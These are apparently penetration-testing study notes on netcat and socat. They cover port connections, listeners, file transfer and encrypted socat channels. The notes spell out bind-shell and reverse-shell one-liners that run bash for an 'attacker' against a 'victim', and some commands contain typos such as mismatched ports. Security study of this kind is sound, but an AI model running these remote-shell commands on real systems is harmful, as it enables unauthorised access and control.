# Practical Tools

一些渗透场景中, 目标环境中一般已有的工具

## Netcat

utility which reads and writes data across network connections, using TCP or UDP protocols

### Connecting to a TCP/UDP Port

- `n` skip dns name resolution
- `v` add some verbosity

```bash
nc -nv ip port
```

### Listening on a TCP/UDP Port

- `n` diable dns name resolution
- `l` create a listener
- `p` specify the listening port number
- `v` add some verbosity
- `e` specify filename to exec after connect
- `c` specify shell commands to exec after connect
- `k` forces nc to stay listening for another connection after its current connection is completed

```bash
nc -nlvp port
```

### Transferring Files with Netcat

1. use redirection

```bash
# receive
nc -nlvp port > file

# send
nc -nv ip port < file
```

### Remote Administration with Netcat

1. bind shell

```bash
# victim
nc -nlvp port -e bash

# attacker
nc -nv ip port
```

2. reverse shell

```bash
# attacker
nc -nlvp export 

# victim
nc -nv ip port -e bash

```

## Socat

1. netcat & socat

```bash
# listen on 80
nc -lvp localhost 443
socat TCP4-LISTEN:443 STDOUT

# connect to  remote_ip:80
nc remote_ip 80
socat - TCP4:remote_ip:80
```

2. Socat File Transfers

```bash
# sender
socat TCP4-LISTEN:443,fork file:xxxxx

# receiver
socat - TCP4:remote_ip:80 file:xxxxx,create
```

3. Socat Reverse Shells

```bash
# reverse shell
## attacker
socat -d -d TCP4-LISTEN:port STDOUT
## victim
socat TCP4:attacker_ip:port EXEC:/bin/bash

# bind shell
## victim
socat -d -d TCP4-LISTEN:prot STDOUT EXEC:/bin/bash
## attacker
socat - TCP4:attacker_ip:port STDOUT
```

4. Socat with openssl

```bash
# generate a key
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt

# combine .key and .crt into a .pem
cat xxxx.key xxx.crt > xxx.pem

# listen
socat OPENSSL-LISTEN:port,cert=xxx.pem,verify=0

# connect
socat - OPENSSL:ip:port,verify=0
```

## Powershell & Powercat

## wireshark

## tcpdump
